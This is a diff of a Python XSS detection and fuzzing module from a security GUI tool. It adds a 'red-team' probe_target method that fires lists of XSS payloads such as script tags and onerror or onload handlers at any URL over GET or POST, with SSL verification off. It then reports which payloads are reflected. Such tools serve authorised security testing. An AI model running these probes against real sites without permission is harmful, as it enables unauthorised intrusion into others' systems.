@@ -1,9 +1,45 @@
-# xss_security_gui/xss_detector.py
+﻿# xss_security_gui/xss_detector.py
+"""
+XSSDetector ULTRA 7.1
+---------------------
+• Контекстний аналіз відображеного payload (HTML / JS / DOM)
+• Inline JS аналіз + класифікація DOM-based / Reflected
+• Генератор XSS‑фуззингу для GET/POST з унікальною дедуплікацією
+• Threat Intel‑friendly події (add_threat), але ніколи не ламає GUI
+• Реальний бойовий red-team probe для GET/POST target endpoints
+"""
 
-from typing import Any, Union, Optional, List, Dict, Tuple
-from bs4 import BeautifulSoup
+from __future__ import annotations
+
+import json
 import re
-from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+from typing import Any, Dict, List, Optional, Set, Tuple, Union
+from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
+
+try:
+    from bs4 import BeautifulSoup
+except ImportError:  # pragma: no cover
+    BeautifulSoup = None
+
+try:
+    import requests
+except ImportError:  # pragma: no cover
+    requests = None
+
+try:
+    from xss_security_gui.ai_core.synthetic_xss import generate_synthetic_xss
+except Exception:  # pragma: no cover
+    def generate_synthetic_xss(n: int = 200) -> List[str]:
+        items = [
+            "<svg/onload=alert(1)>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "<script>alert(1)</script>",
+            "\"\"><script>alert(1)</script>",
+            "<body onload=alert(1)>",
+            "<iframe src=javascript:alert(1)>",
+        ]
+        return items[: max(1, min(n, len(items)))]
 
 
 # ======================
@@ -20,34 +56,58 @@ DEFAULT_XSS_VECTORS: List[str] = [
     '<scr<script>ipt>alert(1)</scr<script>ipt>',
     "'\"><svg/onload=alert(1)>",
     "';alert(1);//",
-    "\"><script>confirm(1)</script>",
+    '\"><script>confirm(1)</script>',
 ]
 
-# Попередньо скомпільовані патерни для швидкості
-_ATTR_ON_EVENT_RE = re.compile(r'\son\w+\s*=')
-_ATTR_GENERIC_RE = re.compile(r'\s[\w:-]+\s*=\s*["\'].*?["\']')
+_ATTR_ON_EVENT_RE = re.compile(r"\son\w+\s*=")
+_ATTR_GENERIC_RE = re.compile(r"\s[\w:-]+\s*=\s*['\"].*?['\"]", re.DOTALL)
 
-
-# ===========================================
-# Класс XSSDetector с Threat Intel интеграцией
-# ===========================================
 
 class XSSDetector:
     def __init__(self, threat_tab: Any = None) -> None:
-        """
-        Конструктор: принимает threat_tab для интеграции в Threat Intel.
-        threat_tab ожидается с методом add_threat(dict).
-        """
         self.threat_tab = threat_tab
+        self.session = requests.Session() if requests is not None else None
+        self.default_headers = {
+            "User-Agent": "Mozilla/5.0 (XSS-RedTeam/7.1)",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        }
 
-    # -------------------------------------------
-    # Контекстная эвристика и анализ HTML/JS
-    # -------------------------------------------
-    def detect_xss_context(self, response_text: str, payload: str, window: int = 160) -> Optional[str]:
-        """
-        Возвращает тип контекста для отражённого payload.
-        """
-        if not payload:
+    def build_payload_set(
+        self,
+        include_default: bool = True,
+        limit: int = 200,
+        custom_payloads: Optional[List[str]] = None,
+    ) -> List[str]:
+        payloads: List[str] = []
+        seen: Set[str] = set()
+
+        if include_default:
+            payloads.extend(DEFAULT_XSS_VECTORS)
+        if custom_payloads:
+            payloads.extend(custom_payloads)
+        try:
+            payloads.extend(generate_synthetic_xss(max(1, limit)))
+        except Exception:
+            pass
+
+        unique: List[str] = []
+        for vector in payloads:
+            if not vector or vector in seen:
+                continue
+            seen.add(vector)
+            unique.append(vector)
+            if len(unique) >= max(1, limit):
+                break
+        return unique
+
+    def detect_xss_context(
+        self,
+        response_text: str,
+        payload: str,
+        window: int = 160,
+    ) -> Optional[str]:
+
+        if not payload or not response_text:
             return None
 
         index = response_text.find(payload)
@@ -59,7 +119,6 @@ class XSSDetector:
         snippet = response_text[start:end]
         snippet_lower = snippet.lower()
 
-        # 1) Внутри <script>...</script>?
         rel_index = index - start
         left_tag_open = snippet_lower.rfind("<script", 0, rel_index)
         right_tag_close = snippet_lower.find("</script>", rel_index)
@@ -72,7 +131,6 @@ class XSSDetector:
         if in_script:
             context = "📜 Reflected JS"
         else:
-            # 2) Явные JS-контексты рядом
             js_indicators = (
                 "eval(",
                 "new function",
@@ -88,7 +146,6 @@ class XSSDetector:
             if any(i in snippet_lower for i in js_indicators):
                 context = "📜 Reflected JS"
             else:
-                # 3) Атрибутный контекст
                 lt = snippet_lower.rfind("<", 0, rel_index)
                 gt = snippet_lower.find(">", rel_index)
 
@@ -118,36 +175,41 @@ class XSSDetector:
                 else:
                     context = "❓ Unknown"
 
-        if self.threat_tab and context:
-            try:
-                self.threat_tab.add_threat(
-                    {
-                        "type": "XSS",
-                        "payload": payload,
-                        "context": context,
-                        "snippet": snippet,
-                        "source": "XSSDetector",
-                    }
-                )
-            except Exception:
-                # Threat Intel не должен ломать детектор
-                pass
+        self._safe_threat_add(
+            {
+                "type": "XSS",
+                "payload": payload,
+                "context": context,
+                "snippet": snippet,
+                "source": "XSSDetector",
+            }
+        )
 
         return context
 
-    # -------------------------------------------
-    # Inline JS анализ
-    # -------------------------------------------
     def extract_inline_js_blocks(self, html: str) -> List[str]:
-        """Извлекает все inline <script> без src."""
-        soup = BeautifulSoup(html, "html.parser")
-        return [s.get_text(strip=True) for s in soup.find_all("script") if not s.get("src")]
+        if not html or BeautifulSoup is None:
+            return []
 
-    def scan_inline_js_for_payload(self, html: str, payload: str, window: int = 60) -> List[Tuple[str, str]]:
-        """
-        Проверяет inline JS-блоки на наличие payload'а и классифицирует.
-        """
-        if not payload:
+        try:
+            soup = BeautifulSoup(html, "html.parser")
+            scripts = soup.find_all("script")
+            return [
+                s.get_text(strip=True)
+                for s in scripts
+                if not s.get("src")
+            ]
+        except Exception:
+            return []
+
+    def scan_inline_js_for_payload(
+        self,
+        html: str,
+        payload: str,
+        window: int = 60,
+    ) -> List[Tuple[str, str]]:
+
+        if not payload or not html:
             return []
 
         scripts = self.extract_inline_js_blocks(html)
@@ -159,25 +221,20 @@ class XSSDetector:
                 snippet = self.get_code_snippet(code, payload, window=window)
                 hits.append((vuln_type, snippet))
 
-                if self.threat_tab:
-                    try:
-                        self.threat_tab.add_threat(
-                            {
-                                "type": "XSS_INLINE",
-                                "payload": payload,
-                                "context": vuln_type,
-                                "snippet": snippet,
-                                "source": "XSSDetector",
-                            }
-                        )
-                    except Exception:
-                        pass
+                self._safe_threat_add(
+                    {
+                        "type": "XSS_INLINE",
+                        "payload": payload,
+                        "context": vuln_type,
+                        "snippet": snippet,
+                        "source": "XSSDetector",
+                    }
+                )
 
         return hits
 
     def classify_js_payload(self, code: str) -> str:
-        """Грубая классификация JS-контекста для payload внутри inline-скрипта."""
-        code_lower = code.lower()
+        code_lower = (code or "").lower()
         dom_indicators = (
             "eval(",
             "new function",
@@ -192,19 +249,21 @@ class XSSDetector:
         return "🧠 DOM-based" if any(ind in code_lower for ind in dom_indicators) else "📜 Reflected JS"
 
     def get_code_snippet(self, text: str, payload: str, window: int = 60) -> str:
-        """Возвращает сниппет текста вокруг payload без переводов строк."""
-        if not payload:
+        if not payload or not text:
             return ""
-        index = text.find(payload)
-        if index == -1:
-            return ""
-        start = max(0, index - window)
-        end = index + len(payload) + window
-        return text[start:end].replace("\n", " ").strip()
 
-    # -------------------------------------------
-    # Утилита сборки GET‑URL с учётом query
-    # -------------------------------------------
+        try:
+            index = text.find(payload)
+            if index == -1:
+                return ""
+
+            start = max(0, index - window)
+            end = index + len(payload) + window
+            snippet = text[start:end]
+            return snippet.replace("\n", " ").strip()
+        except Exception:
+            return ""
+
     def _build_get_url(self, base_url: str, params_dict: Dict[str, Any]) -> str:
         split = urlsplit(base_url)
         existing = dict(parse_qsl(split.query, keep_blank_values=True))
@@ -219,9 +278,10 @@ class XSSDetector:
         query = urlencode(merged, doseq=True, safe="()[],'\"<>/\\;:")
         return urlunsplit((split.scheme, split.netloc, split.path, query, split.fragment))
 
-    # -------------------------------------------
-    # Генератор XSS‑фуззинга для GET и POST
-    # -------------------------------------------
+    @staticmethod
+    def _stable_dedupe_key(value: Any) -> str:
+        return json.dumps(value, sort_keys=True, default=str, separators=(",", ":"))
+
     def fuzz_xss_parameters(
         self,
         base_url: str,
@@ -230,7 +290,7 @@ class XSSDetector:
         xss_vectors: Optional[List[str]] = None,
     ) -> List[Union[str, Dict[str, Any]]]:
 
-        vectors = xss_vectors or DEFAULT_XSS_VECTORS
+        vectors = xss_vectors if xss_vectors is not None else self.build_payload_set(limit=200)
 
         base_params: Dict[str, Any] = {
             k: [str(x) for x in v] if isinstance(v, (list, tuple)) else ("" if v is None else str(v))
@@ -247,13 +307,10 @@ class XSSDetector:
             return modified
 
         results: List[Union[str, Dict[str, Any]]] = []
-        seen: set = set()
+        seen: Set[str] = set()
 
         m = method.upper()
 
-        # -----------------------
-        # GET fuzzing
-        # -----------------------
         if m == "GET":
             for vector in vectors:
                 for key in base_params:
@@ -266,39 +323,23 @@ class XSSDetector:
                     results.append(fuzzed_url)
                     seen.add(fuzzed_url)
 
-                    if self.threat_tab:
-                        try:
-                            self.threat_tab.add_threat(
-                                {
-                                    "type": "XSS_FUZZ",
-                                    "method": "GET",
-                                    "url": fuzzed_url,
-                                    "param": key,
-                                    "payload": vector,
-                                    "source": "XSSDetector",
-                                }
-                            )
-                        except Exception:
-                            pass
+                    self._safe_threat_add(
+                        {
+                            "type": "XSS_FUZZ",
+                            "method": "GET",
+                            "url": fuzzed_url,
+                            "param": key,
+                            "payload": vector,
+                            "source": "XSSDetector",
+                        }
+                    )
 
-        # -----------------------
-        # POST fuzzing
-        # -----------------------
         elif m == "POST":
             for vector in vectors:
                 for key in base_params:
                     mutated = mutate_params(base_params, key, vector)
                     entry = {"url": base_url, "json": mutated}
-
-                    key_ = (
-                        entry["url"],
-                        tuple(
-                            sorted(
-                                (k, tuple(v) if isinstance(v, list) else v)
-                                for k, v in entry["json"].items()
-                            )
-                        ),
-                    )
+                    key_ = self._stable_dedupe_key(entry)
 
                     if key_ in seen:
                         continue
@@ -306,20 +347,112 @@ class XSSDetector:
                     results.append(entry)
                     seen.add(key_)
 
-                    if self.threat_tab:
-                        try:
-                            self.threat_tab.add_threat(
-                                {
-                                    "type": "XSS_FUZZ",
-                                    "method": "POST",
-                                    "url": base_url,
-                                    "param": key,
-                                    "payload": vector,
-                                    "json": mutated,
-                                    "source": "XSSDetector",
-                                }
-                            )
-                        except Exception:
-                            pass
+                    self._safe_threat_add(
+                        {
+                            "type": "XSS_FUZZ",
+                            "method": "POST",
+                            "url": base_url,
+                            "param": key,
+                            "payload": vector,
+                            "json": mutated,
+                            "source": "XSSDetector",
+                        }
+                    )
 
         return results
+
+    def probe_target(
+        self,
+        url: str,
+        payloads: Optional[List[str]] = None,
+        method: str = "GET",
+        params: Optional[Dict[str, Any]] = None,
+        headers: Optional[Dict[str, str]] = None,
+        timeout: float = 10.0,
+        verify_ssl: bool = False,
+        json_payload: Optional[Dict[str, Any]] = None,
+    ) -> List[Dict[str, Any]]:
+        if not url or self.session is None:
+            return []
+
+        vectors = self.build_payload_set(limit=100, custom_payloads=payloads)
+        if not vectors:
+            return []
+
+        merged_params = dict(params or {})
+        req_headers = {**self.default_headers, **(headers or {})}
+        result_rows: List[Dict[str, Any]] = []
+
+        for payload in vectors:
+            send_params = dict(merged_params)
+            if send_params:
+                for key in list(send_params.keys()):
+                    current = send_params[key]
+                    send_params[key] = current + payload if isinstance(current, str) else payload
+            else:
+                send_params = {"q": payload}
+
+            try:
+                if method.upper() == "POST":
+                    response = self.session.request(
+                        method.upper(),
+                        url,
+                        headers=req_headers,
+                        params=None,
+                        data=send_params,
+                        json=json_payload,
+                        timeout=timeout,
+                        verify=verify_ssl,
+                    )
+                else:
+                    response = self.session.request(
+                        method.upper(),
+                        url,
+                        headers=req_headers,
+                        params=send_params,
+                        timeout=timeout,
+                        verify=verify_ssl,
+                    )
+
+                body = response.text or ""
+                context = self.detect_xss_context(body, payload) if payload in body else None
+                hit = bool(payload in body or context is not None)
+
+                row = {
+                    "method": method.upper(),
+                    "url": url,
+                    "payload": payload,
+                    "status_code": response.status_code,
+                    "length": len(body),
+                    "reflected": hit,
+                    "context": context,
+                    "snippet": self.get_code_snippet(body, payload, window=80),
+                }
+                result_rows.append(row)
+
+                self._safe_threat_add(
+                    {
+                        "type": "XSS_PROBE",
+                        "method": method.upper(),
+                        "url": url,
+                        "payload": payload,
+                        "status_code": response.status_code,
+                        "context": context,
+                        "reflected": hit,
+                        "source": "XSSDetector",
+                    }
+                )
+            except Exception:
+                continue
+
+        return result_rows
+
+    def _safe_threat_add(self, payload: Dict[str, Any]) -> None:
+        if not payload or self.threat_tab is None:
+            return
+        try:
+            add_threat = getattr(self.threat_tab, "add_threat", None)
+            if callable(add_threat):
+                add_threat(payload)
+        except Exception:
+            pass
